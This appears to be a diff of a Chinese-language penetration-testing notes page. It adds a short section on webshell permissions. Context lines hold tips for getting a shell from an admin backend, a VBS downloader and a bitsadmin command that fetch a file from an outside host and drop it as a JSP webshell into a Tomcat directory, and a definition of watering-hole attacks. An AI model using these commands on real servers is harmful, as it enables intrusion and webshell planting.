@@ -900,7 +900,7 @@
                 
                   <span class="post-meta-item-text">Edited on</span>
                 
-                <time title="Modified: 2019-06-29 22:11:30" itemprop="dateModified" datetime="2019-06-29T22:11:30+08:00">2019-06-29</time>
+                <time title="Modified: 2019-06-30 18:04:32" itemprop="dateModified" datetime="2019-06-30T18:04:32+08:00">2019-06-30</time>
               
             
           </span>
@@ -985,6 +985,7 @@
 <h1 id="后台拿Shell"><a href="#后台拿Shell" class="headerlink" title="后台拿Shell"></a>后台拿Shell</h1><p>修改模板代码</p>
 <p>修改上传图片格式</p>
 <p>上传模板若会自动解压，可以上传zip压缩包</p>
+<h1 id="WebShell"><a href="#WebShell" class="headerlink" title="WebShell"></a>WebShell</h1><h2 id="WebShell的权限"><a href="#WebShell的权限" class="headerlink" title="WebShell的权限"></a>WebShell的权限</h2><p>Webshell的权限一般是由解析执行WebShell的Web容器自身权限决定的<br>如果是linux做了操作系统加固 能上传 但是只能执行系统命令权限 但是无法获得shell那就说明做了目录权限加固但是没有做中间件加固（可上传）没做操作系统加固<br>目录加固的权限是可读可执行但不可写</p>
 <h1 id="Windows提权"><a href="#Windows提权" class="headerlink" title="Windows提权"></a>Windows提权</h1><h2 id="PowerShell提权"><a href="#PowerShell提权" class="headerlink" title="PowerShell提权"></a>PowerShell提权</h2><h2 id="DOS下载文件"><a href="#DOS下载文件" class="headerlink" title="DOS下载文件"></a>DOS下载文件</h2><h3 id="1-创建downfile-vbs下载文件"><a href="#1-创建downfile-vbs下载文件" class="headerlink" title="1.创建downfile.vbs下载文件"></a>1.创建downfile.vbs下载文件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo set a=createobject(^&quot;adod^&quot;+^&quot;b.stream^&quot;):set w=createobject(^&quot;micro^&quot;+^&quot;soft.xmlhttp^&quot;):w.open^&quot;get^&quot;,wsh.arguments(0),0:w.send:a.type=1:a.open:a.write w.responsebody:a.savetofile wsh.arguments(1),2  &gt;&gt; downfile.vbs</span><br><span class="line">cscript downfile.vbs http://192.168.40.13:9090/fileLibrary/5d5X9mSTZXjH9VlhXNN/x.txt D:\\tomcat8.5\\webapps\\x.jsp</span><br></pre></td></tr></table></figure>
 <h3 id="2-使用bitsadmin命令"><a href="#2-使用bitsadmin命令" class="headerlink" title="2.使用bitsadmin命令"></a>2.使用bitsadmin命令</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bitsadmin /transfer n http://www.xx.com/code.jpg c:\users\sdyp\desktop\ff.jpg</span><br></pre></td></tr></table></figure>
 <h1 id="名词解释"><a href="#名词解释" class="headerlink" title="名词解释"></a>名词解释</h1><h2 id="钓鱼攻击"><a href="#钓鱼攻击" class="headerlink" title="钓鱼攻击"></a>钓鱼攻击</h2><h3 id="水坑攻击"><a href="#水坑攻击" class="headerlink" title="水坑攻击"></a>水坑攻击</h3><p>一种计算机入侵手法，其针对的目标多为特定的团体（组织、行业、地区等）。攻击者首先通过猜测（或观察）确定这组目标经常访问的网站，并入侵其中一个或多个，植入恶意软件，最后，达到感染该组目标中部分成员的目的。</p>
